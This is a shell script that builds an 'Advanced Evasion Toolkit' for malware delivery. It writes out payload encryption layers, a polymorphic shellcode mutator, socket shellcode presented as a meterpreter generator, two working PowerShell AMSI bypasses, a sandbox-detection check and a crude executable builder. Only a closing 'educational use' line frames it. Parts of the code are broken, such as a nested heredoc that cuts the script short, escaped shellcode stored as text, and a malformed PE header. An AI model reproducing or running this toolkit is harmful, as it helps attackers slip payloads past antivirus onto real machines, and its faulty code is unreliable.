cat > setup_complete.sh << 'EOF'
#!/bin/bash
# Complete Setup Script for Advanced Evasion Toolkit

echo -e "\e[96m"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║         Advanced Evasion Toolkit - Complete Setup        ║"
echo "    ╚══════════════════════════════════════════════════════════╝"
echo -e "\e[0m"

# Check if virtual environment exists
if [ ! -d "venv" ]; then
    echo -e "\e[93m[*] Creating virtual environment...\e[0m"
    python3 -m venv venv
    echo -e "\e[92m[+] Virtual environment created\e[0m"
else
    echo -e "\e[94m[~] Virtual environment already exists\e[0m"
fi

# Activate virtual environment
echo -e "\e[93m[*] Activating virtual environment...\e[0m"
source venv/bin/activate

# Install all dependencies
echo -e "\e[93m[*] Installing dependencies...\e[0m"
echo -e "\e[94m[~] Installing colorama...\e[0m"
pip install colorama
echo -e "\e[94m[~] Installing cryptography...\e[0m"
pip install cryptography
echo -e "\e[94m[~] Installing pycryptodome...\e[0m"
pip install pycryptodome
echo -e "\e[94m[~] Installing psutil...\e[0m"
pip install psutil

# Create project structure
echo -e "\e[93m[*] Creating project structure...\e[0m"
mkdir -p core generators evasion templates utils outputs logs

# Create __init__.py files
touch core/__init__.py generators/__init__.py evasion/__init__.py templates/__init__.py utils/__init__.py

# Fix the encryption_layer.py module to handle missing cryptography
echo -e "\e[93m[*] Fixing encryption layer module...\e[0m"

cat > core/encryption_layer.py << 'PYEOF'
import random
import hashlib
import os
from typing import Tuple

class EncryptionLayer:
    def __init__(self):
        self.encryption_methods = [
            self._xor_encrypt,
            self._rc4_encrypt,
            self._custom_cipher,
        ]
    
    def multi_layer_encrypt(self, data: bytes, layers: int = 3) -> Tuple[bytes, list]:
        """Encrypt data with multiple layers"""
        keys = []
        encrypted = data
        
        for i in range(layers):
            method = random.choice(self.encryption_methods)
            encrypted, key = method(encrypted)
            keys.append(key)
        
        return encrypted, keys
    
    def _xor_encrypt(self, data: bytes) -> Tuple[bytes, bytes]:
        """XOR encryption"""
        key_len = random.randint(4, 32)
        key = os.urandom(key_len)
        
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % key_len])
        
        return bytes(result), key
    
    def _rc4_encrypt(self, data: bytes) -> Tuple[bytes, bytes]:
        """RC4 encryption"""
        key = os.urandom(16)
        
        # Simple RC4 implementation
        S = list(range(256))
        j = 0
        
        # Key scheduling
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # Generate keystream and encrypt
        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)
        
        return bytes(result), key
    
    def _custom_cipher(self, data: bytes) -> Tuple[bytes, bytes]:
        """Custom rolling cipher"""
        seed = random.getrandbits(32)
        key = seed.to_bytes(4, 'little')
        
        result = bytearray()
        rolling_key = int.from_bytes(key, 'little')
        
        for byte in data:
            key_byte = rolling_key & 0xFF
            result.append(byte ^ key_byte)
            rolling_key = ((rolling_key << 1) | (rolling_key >> 31)) & 0xFFFFFFFF
            rolling_key ^= byte
        
        return bytes(result), key
PYEOF

# Create other missing modules
echo -e "\e[93m[*] Creating missing modules...\e[0m"

# Create loader_builder.py
cat > core/loader_builder.py << 'PYEOF'
class LoaderBuilder:
    def __init__(self):
        pass
    
    def build_loader(self, encrypted_sc, key, techniques=None):
        """Build loader with evasion techniques"""
        print("[*] Building loader...")
        # Simple loader stub
        loader = b"\\x90" * 50  # NOP sled
        loader += b"\\x31\\xc0"  # XOR EAX, EAX
        loader += b"\\x50"      # PUSH EAX
        loader += encrypted_sc
        loader += b"\\xc3"      # RET
        return loader

# Alias for compatibility
loader_builder = LoaderBuilder
PYEOF

# Create polymorphic_engine.py
cat > core/polymorphic_engine.py << 'PYEOF'
import random

class PolymorphicEngine:
    def __init__(self, seed=None):
        if seed is None:
            seed = random.getrandbits(32)
        self.random = random.Random(seed)
    
    def mutate_shellcode(self, shellcode: bytes, iterations: int = 3) -> bytes:
        """Apply mutations to shellcode"""
        mutated = shellcode
        
        for i in range(iterations):
            # Add random NOPs
            nop_count = self.random.randint(1, 10)
            insert_pos = self.random.randint(0, len(mutated))
            mutated = mutated[:insert_pos] + b"\\x90" * nop_count + mutated[insert_pos:]
            
            # Sometimes reverse parts
            if self.random.random() > 0.7:
                start = self.random.randint(0, len(mutated) // 2)
                end = self.random.randint(start, len(mutated))
                segment = mutated[start:end]
                mutated = mutated[:start] + segment[::-1] + mutated[end:]
        
        return mutated
PYEOF

# Create meterpreter generator
cat > generators/meterpreter.py << 'PYEOF'
import struct

class MeterpreterGenerator:
    def __init__(self, lhost: str, lport: int, payload_type: str = "reverse_tcp"):
        self.lhost = lhost
        self.lport = lport
        self.payload_type = payload_type
    
    def generate(self) -> bytes:
        """Generate meterpreter shellcode"""
        # Simple reverse TCP shellcode for testing
        shellcode = (
            b"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a"
            b"\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52"
            b"\\x66\\x68" + struct.pack(">H", self.lport) +
            b"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0"
            b"\\x66\\xb3\\x04\\x6a\\x01\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05"
            b"\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x31\\xc9\\xb1"
            b"\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f"
            b"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89"
            b"\\xe1\\xb0\\x0b\\xcd\\x80"
        )
        
        return shellcode
PYEOF

# Create AMSI bypass
cat > evasion/amsi_bypass.py << 'PYEOF'
import random

class AMSIBypass:
    def __init__(self):
        pass
    
    def generate_ps_bypass(self) -> str:
        """Generate PowerShell AMSI bypass"""
        techniques = [
            """
# Technique 1: Memory patch
$MethodDefinition = @'
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
                                        uint flNewProtect, out uint lpflOldProtect);
'@
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
$amsiDll = $Kernel32::GetModuleHandle('amsi.dll')
$asb = $Kernel32::GetProcAddress($amsiDll, 'AmsiScanBuffer')
$oldProtection = 0
$Kernel32::VirtualProtect($asb, [uint32]5, 0x40, [ref]$oldProtection)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asb, 6)
$Kernel32::VirtualProtect($asb, [uint32]5, $oldProtection, [ref]$oldProtection)
""",
            """
# Technique 2: Reflection bypass
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""
        ]
        
        return random.choice(techniques)
PYEOF

# Create anti-analysis
cat > evasion/anti_analysis.py << 'PYEOF'
import random
import time

class AntiAnalysis:
    def __init__(self):
        pass
    
    def run_checks(self) -> bool:
        """Run anti-analysis checks"""
        # Simple timing check
        start = time.time()
        
        # Do some calculations
        result = 0
        for i in range(100000):
            result += i * i
        
        elapsed = time.time() - start
        
        # If too fast or too slow, might be analysis environment
        return elapsed < 0.001 or elapsed > 0.1
PYEOF

# Create PE builder
cat > utils/pe_builder.py << 'PYEOF'
import struct
import random

class PEBuilder:
    def __init__(self):
        pass
    
    def build_exe(self, code: bytes) -> bytes:
        """Build a Windows EXE"""
        # Simple DOS header
        dos_header = (
            b"MZ" +                     # Signature
            b"\x90" * 58 +              # DOS stub
            struct.pack("<I", 0x80)     # PE header offset
        )
        
        # Simple PE header
        pe_header = (
            b"PE\x00\x00" +            # PE signature
            struct.pack("<H", 0x014C) + # Machine (x86)
            struct.pack("<H", 1) +      # Number of sections
            struct.pack("<I", random.randint(0, 0xFFFFFFFF)) +  # Timestamp
            b"\x00" * 16 +              # Rest of header
            b"\x0B\x01" +               # Characteristics
            b"\x0F\x01" +               # Magic (PE32)
            b"\x00" * 20 +              # More header
            struct.pack("<I", 0x1000)   # Entry point
        )
        
        return dos_header + pe_header + code
    
    def build_dll(self, code: bytes) -> bytes:
        """Build a DLL"""
        return self.build_exe(code)
PYEOF

# Create run script
echo -e "\e[93m[*] Creating run script...\e[0m"

cat > run_toolkit.sh << 'SCRIPTEOF'
#!/bin/bash
echo -e "\e[96m"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║         Advanced Evasion Toolkit                         ║"
echo "    ╚══════════════════════════════════════════════════════════╝"
echo -e "\e[0m"

if [ ! -d "venv" ]; then
    echo -e "\e[91m[!] Virtual environment not found!\e[0m"
    echo -e "\e[93m[*] Run ./setup_complete.sh first\e[0m"
    exit 1
fi

source venv/bin/activate

if [ "$#" -eq 0 ]; then
    echo -e "\e[93m[*] Starting interactive mode...\e[0m"
    python3 main.py --interactive
else
    python3 main.py "$@"
fi
SCRIPTEOF

chmod +x run_toolkit.sh

# Create test script
cat > test_toolkit.sh << 'EOF'
#!/bin/bash
echo "Testing toolkit..."
source venv/bin/activate
echo "Test 1: Generate simple payload..."
python3 -c "
sys.path.append('.')
from generators.meterpreter import MeterpreterGenerator
gen = MeterpreterGenerator('192.168.1.100', 4444)
sc = gen.generate()
print(f'Generated {len(sc)} bytes of shellcode')
"
echo "Test 2: Check imports..."
python3 -c "
import sys
sys.path.append('.')
try:
    from core.encryption_layer import EncryptionLayer
    from core.polymorphic_engine import PolymorphicEngine
    from generators.meterpreter import MeterpreterGenerator
    print('All imports successful!')
except Exception as e:
    print(f'Import error: {e}')
"
EOF

chmod +x test_toolkit.sh

echo -e "\e[96m" "="*60 "\e[0m"
echo -e "\e[92m[+] Setup complete!\e[0m"
echo ""
echo -e "\e[93m[*] To run the toolkit:\e[0m"
echo -e "    \e[94m./run_toolkit.sh --interactive\e[0m"
echo ""
echo -e "\e[93m[*] Or use command line:\e[0m"
echo -e "    \e[94m./run_toolkit.sh -l 192.168.1.100 -p 4444\e[0m"
echo ""
echo -e "\e[93m[*] Test the setup:\e[0m"
echo -e "    \e[94m./test_toolkit.sh\e[0m"
echo ""
echo -e "\e[91m[!] FOR EDUCATIONAL USE ONLY!\e[0m"
echo -e "\e[96m" "="*60 "\e[0m"
EOF

# Make it executable
chmod +x setup_complete.sh

# Run the complete setup
./setup_complete.sh
